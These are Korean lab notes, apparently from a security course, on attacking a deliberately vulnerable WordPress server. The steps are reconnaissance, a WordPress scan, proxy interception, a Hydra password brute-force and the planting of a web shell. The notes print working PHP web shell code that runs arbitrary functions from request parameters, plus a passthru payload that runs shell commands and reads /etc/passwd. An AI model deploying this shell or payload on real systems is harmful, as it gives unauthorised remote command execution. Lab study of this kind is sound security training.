[[slitaz linux set]]

# \[탐색]
![[Pasted image 20240930112524.png]]
![[Pasted image 20240930112731.png]]
- CVE-2003-1418 디렉토리에 적용가능한 취약점을 알려줌

도메인 이름을 설정하고 탐색 가능
![[Pasted image 20240930113646.png]]

탐색할 디렉토리에 대한 정보를 알려주는 것 또한 가능
![[Pasted image 20240930114046.png]]

`readme.html`에서 버전을 확인
![[Pasted image 20240930113945.png]]

# \[웹 접속]
![[Pasted image 20240930113020.png]]
![[Pasted image 20240930114904.png]] 힌트

워드프래스 스캔
![[Pasted image 20240930120427.png]]
![[Pasted image 20240930120847.png]]
![[Pasted image 20240930120753.png]]
- admin에 대한 로그인 정보가 있다는 것을 알 수 있다.

# \[Password Attack]
프록시를 설정하고 로그인 페이지와 내가 주고 받는 정보를 볼 수 있다.
![[Pasted image 20240930121424.png]]
parameter='value'& 구조로 되어 있다.
![[Pasted image 20240930121958.png]]
- action 파라미터에 성공에 대한 정보가 들어가면 로그인이 될 것이다.


![[Pasted image 20240930122530.png]]
포스트 방식으로 서버에 요청한 점을 활용

히드라 툴을 활용한 [[Brute Force Attack]]

![[Pasted image 20240930124220.png]]
- 취약한 비밀번호를 이용해 관리자 툴에 접속에 성공

# \[Web Shell]
힌트에서 나왔듯 웹 쉘을 활용해 서버에 언제든 접속 가능하게 할 수 있다.
![[Pasted image 20240930124813.png]]
![[Pasted image 20240930125025.png]]
![[Pasted image 20240930140229.png]]
- 플러그인의 취약점을 활용해 웹 쉘을 작성

![[Pasted image 20240930140302.png]]![[Pasted image 20240930143355.png]]
```
@extract($_REQUEST); // 문자열을 입력받아 추출
if (isset($x) && isset($y)) @die($x($y)); // 추출 결과가 x(함수) y(명령어)에 대입
```
코드 변경사항 저장

`http://vulnwp/wordpress/wp-content/plugins/`에 플러그인이 모두 저장되어 있다.
![[Pasted image 20240930141315.png]]
`x=passthru&y=pwd;uname -a cat /etc/issu; cat /etc/passwd;` 이어서 명령어를 입력할 수 있다.
![[Pasted image 20240930143420.png]]
![[Pasted image 20240930143510.png]]

![[Pasted image 20240930142417.png]]
브라우저에서는 문자열로 인식하기 때문에 웹 쉘을 사용하게 된다.


![[Pasted image 20240930142533.png]]
![[Pasted image 20240930142544.png]]프록시에서 인터셉트 모드를 켠 상태

![[Pasted image 20240930142648.png]]
로그인 시도 > 브래이크 포인트에 갖힘
![[Pasted image 20240930142744.png]]
![[Pasted image 20240930142930.png]]![[Pasted image 20240930142944.png]]![[Pasted image 20240930143000.png]]

![[Pasted image 20240930143731.png]]
엑티브 스캔 툴을 활용해 스캔 작업을 더 편리하게(더 상세하게) 검사할 수 있다.
![[Pasted image 20240930144352.png]]
상세 검사를 통해 알아낸 각각의 취약점에 대한 정보 및 취약점 코드를 확인할 수 있다.

